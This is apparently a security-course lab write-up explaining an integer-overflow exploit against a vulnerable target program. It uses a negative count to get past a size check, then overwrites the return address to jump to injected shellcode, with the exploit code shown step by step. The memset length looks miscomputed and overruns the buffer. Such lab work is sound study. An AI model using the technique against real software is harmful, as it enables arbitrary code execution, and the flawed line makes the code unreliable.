This program has integer overflow vulnerability and we will use this
vulnerability to bypass limitation of copying data on buf in target2. 

Size of arg1 must be large enough to overflow and overwrite return address.
Current size of it is MAX_WIDGETS*sizeof(struct widget)=268*32=8576;
therefore, we choose 269*32=8608 as size of arg1.
	
	char arg1[8608];

For copying arg1 into the buffer of foo function we must choose a negative
number x which x*32=8608. We found that x can be -2147483379.

	char *first = "-2147483379,";

We copy this negative number (as count) at the begining of the arg1.

	strcpy(arg1, first);

Next, we copy our shellcode.

	strcat(arg1, shellcode);

Next, we fill rest of the arg1 with a non-null characters (here we use 0x55
that is NOP or U)

	memset(arg1+strlen(first)+strlen(shellcode),0x55,8608-strlen(first)+strlen(shellcode));

At the end, we put the address of buf (which is the address of our shellcode)
on address of arg1+8592. In this way, when arg1 will be copied on buf, 
"return address" will be overwritten by address of our shellcode.

	*(unsigned *)(&arg1[8592])=0xbeffba48;

Finally, we run target2 with arg1 as its input.

	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");
